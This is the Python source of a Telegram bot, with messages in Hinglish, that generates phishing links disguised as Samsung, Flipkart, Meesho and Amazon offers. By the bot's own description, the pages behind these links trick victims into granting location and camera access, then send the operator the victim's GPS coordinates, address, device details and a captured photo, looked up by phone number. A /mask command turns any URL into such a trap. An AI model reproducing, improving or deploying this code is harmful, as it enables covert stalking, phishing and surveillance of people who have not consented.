import os
import requests
import telebot
from dotenv import load_dotenv
from datetime import datetime
from geopy.geocoders import Nominatim
import re
import base64
import database

load_dotenv()

TOKEN = os.getenv("BOT_TOKEN")
BACKEND_URL = os.getenv("BACKEND_URL", "http://127.0.0.1:8000")

bot = telebot.TeleBot(TOKEN)

def normalize_phone_number(number):
    cleaned = re.sub(r'[^\d+]', '', number)
    if cleaned.startswith('0'):
        cleaned = '+91' + cleaned[1:]
    elif not cleaned.startswith('+'):
        cleaned = '+' + cleaned
    return cleaned

@bot.message_handler(commands=['start'])
def send_welcome(message):
    custom_msg = (
        "🔴 **Live Location Tracker Bot Active**\n\n"
        "Aapke paas 3 options hain:\n"
        "1️⃣ **Phone Number:** Koi bhi number bhejo (e.g. `9876543210`) history/link ke liye.\n"
        "2️⃣ **Universal Link:** Type `/getlink` aur universal link copy karo.\n"
        "3️⃣ **Custom Link:** Type `/mask <URL>` (e.g. `/mask https://youtube.com`) kisi bhi website ka trackable link banane ke liye."
    )
    bot.reply_to(message, custom_msg, parse_mode="Markdown")

@bot.message_handler(commands=['getlink'])
def generate_generic_link(message):
    reply = f"""🔗 **Universal Tracking Links**
    
In links mein koi number daalne ki zaroorat nahi hai. Jo bhi in par click karega, uski live location turant aapke pass aa jayegi! (Unka ID `LinkUser_XXXX` ke roop mein dikhega)

📱 **Samsung S24 Offer:**\n`{BACKEND_URL}/phones/samsung-galaxy-s24-5g-snapdragon-amber-yellow-128-gb/p/itmd4baa945a78ef`\n
🛍️ **Flipkart Sale:**\n`{BACKEND_URL}/item/flipkart`\n
👗 **Meesho Offer:**\n`{BACKEND_URL}/item/meesho`\n
📦 **Amazon Deal:**\n`{BACKEND_URL}/item/amazon`\n
"""
    bot.reply_to(message, reply, parse_mode="Markdown")

@bot.message_handler(commands=['mask'])
def mask_link(message):
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "⚠️ Error! Sahi tarika: `/mask https://example.com`", parse_mode="Markdown")
        return
    
    original_url = parts[1].strip()
    if not original_url.startswith("http"):
        original_url = "https://" + original_url

    b64_url = base64.b64encode(original_url.encode('utf-8')).decode('utf-8')
    tracking_link = f"{BACKEND_URL}/custom?url={b64_url}"
    
    reply = f"""🔗 **Custom Masked Link Ready!**
    
**Original:** `{original_url}`
**Tracking Link:**
{tracking_link}

Is link par click hone par target ko ek fake 'Special Offer' page dikhega, location lene ke baad wo apne aap `{original_url}` par redirect ho jayega!"""
    bot.reply_to(message, reply, parse_mode="Markdown")

@bot.message_handler(func=lambda m: True)
def fetch_location(message):
    chat_id = str(message.chat.id)
    
    # Save the latest chat ID to the .env file
    with open(".env", "r") as f:
        env_lines = f.readlines()
    with open(".env", "w") as f:
        has_admin = False
        for line in env_lines:
            if line.startswith("ADMIN_CHAT_ID="):
                f.write(f"ADMIN_CHAT_ID={chat_id}\n")
                has_admin = True
            else:
                f.write(line)
        if not has_admin:
            f.write(f"\nADMIN_CHAT_ID={chat_id}\n")
            
    raw_target = message.text.strip()
    if raw_target.startswith("/"):
        return
        
    target = normalize_phone_number(raw_target)
    bot.reply_to(message, f"🔍 Fetching history for → `{target}`", parse_mode="Markdown")
    
    loc = database.get_latest_location(target)
    snap = database.get_latest_snap(target)
    
    if loc:
        reply = f"""
✅ **Location History Found**

**Target:** `{target}`
**Source:** {loc.get('source', 'GPS')}
**Time:** {loc.get('time', 'Now')}

📱 **Device Info:**
- **Battery:** {loc.get('battery', 'Unknown')}
- **OS/Browser:** {loc.get('os_info', 'Unknown')}
- **Screen:** {loc.get('screen', 'Unknown')}

📍 **Coordinates:** {loc['lat']}, {loc['lon']}
🏠 **Address:** {loc['address']}
🗺️ **Map:** https://maps.google.com/?q={loc['lat']},{loc['lon']}
        """
        bot.send_message(message.chat.id, reply, parse_mode="Markdown")
        
        if snap:
            try:
                img_data = base64.b64decode(snap['image_b64'].split(",")[1])
                files = {"photo": ("snap.png", img_data, "image/png")}
                bot.send_photo(message.chat.id, photo=img_data, caption=f"📸 **Last captured photo** ({snap['time']})", parse_mode="Markdown")
            except Exception as e:
                print(f"Error sending history photo: {e}")
        return
        
    b64_target = base64.b64encode(target.encode('utf-8')).decode('utf-8')
    
    reply = f"""⚠️ **No History Found**

No past location data found for `{target}` in the database.

**To get their live location & camera snap, send one of these "Offers" to the target:**
(It will ask for location & camera for "Verification" then redirect them)

🛍️ **Flipkart Sale:** `{BACKEND_URL}/item/flipkart?id={b64_target}`
👗 **Meesho Offer:** `{BACKEND_URL}/item/meesho?id={b64_target}`
📦 **Amazon Deal:** `{BACKEND_URL}/item/amazon?id={b64_target}`
"""
    bot.send_message(message.chat.id, reply, parse_mode="Markdown")

print("🚀 Live Location Bot Started...")
bot.infinity_polling()
